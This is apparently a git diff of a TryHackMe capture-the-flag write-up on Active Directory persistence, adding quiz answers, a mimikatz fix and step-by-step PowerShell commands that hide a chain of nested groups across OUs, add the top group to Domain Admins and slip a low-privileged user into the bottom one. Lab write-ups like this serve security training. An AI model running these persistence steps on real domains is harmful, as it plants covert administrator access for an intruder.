@@ -314,7 +314,7 @@ Now we have golden and silver tickets to the AD environment, providing better pe
 
 * Which AD account's NTLM hash is used to sign Kerberos tickets?
 
-
+	`krbtgt`
 
 * What is the name of a ticket that impersonates a legitimate TGT?
 
@@ -593,6 +593,8 @@ So what's the only solution to remove the persistence? Well, this is why we are 
 
 	`kerberos::ptt ticket.kirbi`
 
+* Practical
+
 	* Login SSH to THMDC
 	
 		```
@@ -606,7 +608,7 @@ So what's the only solution to remove the persistence? Well, this is why we are 
 		```
 		mkdir kakakseram
 		cd kakakseram
-		C:\Tools\mimikatz_trunk\x64\mimikatz.exe`
+		C:\Tools\mimikatz_trunk\x64\mimikatz.exe
 		```
 
 		![task4-mimikatz](./images/task4-mimikatz.png)
@@ -777,6 +779,8 @@ Imagine that you are the blue team dealing with an incident where you have just 
 
 	`Start-Service -Name ntds`
 
+* Practical
+
 	* Get the credential
 	
 		![task5-cred](./images/task5-cred.png)
@@ -895,7 +899,65 @@ If this was a real organisation, we would not be creating new groups to nest. In
 
 * What is the term used to describe AD groups that are members of other AD groups?
 
+	`Group Nesting`
+
 * What is the command to add a new member, thmtest, to the AD group, thmgroup?
+
+	`Add-ADGroupMember -Identity "thmgroup" -Members "thmtest"`
+
+* Prcatical
+
+	* Login SSH to THMDC and run powershell
+	
+		```
+		ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc
+		```
+
+		![task6-ssh](./images/task6-ssh.png)
+
+	* Start by creating a new base group that we will hide in the People->IT Organisational Unit (OU)
+	
+		```
+		New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "kakakseram Net Group 1" -SamAccountName "kakakseram_nestgroup1" -DisplayName "kakakseram Nest Group 1" -GroupScope Global -GroupCategory Security
+		```
+
+		![task6-base-group](./images/task6-base-group.png)
+
+	* Create another group and add our previous group as a member
+	
+		```
+		New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "kakakseram Net Group 2" -SamAccountName "kakakseram_nestgroup2" -DisplayName "kakakseram Nest Group 2" -GroupScope Global -GroupCategory Security
+		Add-ADGroupMember -Identity "kakakseram_nestgroup2" -Members "kakakseram_nestgroup1"
+
+		New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "kakakseram Net Group 3" -SamAccountName "kakakseram_nestgroup3" -DisplayName "kakakseram Nest Group 3" -GroupScope Global -GroupCategory Security
+		Add-ADGroupMember -Identity "kakakseram_nestgroup3" -Members "kakakseram_nestgroup2"
+
+		New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "kakakseram Net Group 4" -SamAccountName "kakakseram_nestgroup4" -DisplayName "kakakseram Nest Group 4" -GroupScope Global -GroupCategory Security
+		Add-ADGroupMember -Identity "kakakseram_nestgroup4" -Members "kakakseram_nestgroup3"
+
+		New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "kakakseram Net Group 5" -SamAccountName "kakakseram_nestgroup5" -DisplayName "kakakseram Nest Group 5" -GroupScope Global -GroupCategory Security
+		Add-ADGroupMember -Identity "kakakseram_nestgroup5" -Members "kakakseram_nestgroup4"
+		```
+
+		![task6-other-group](./images/task6-other-group.png)
+
+	* Get the credential
+	
+		![task6-cred](./images/task6-cred.png)
+
+	* Add last group to the Domain Admins group and add our low-privileged AD user to the first group
+	
+		```
+		Add-ADGroupMember -Identity "Domain Admins" -Members "kakakseram_nestgroup5"
+
+		Add-ADGroupMember -Identity "kakakseram_nestgroup1" -Members "sylvia.robinson"
+		```
+
+		![task6-user](./images/task6-user.png)
+
+	* Verify Inherited Privileges
+	
+		![task6-verify](./images/task6-verify.png)
 
 ## Task 7 - Persistence through ACLs
 
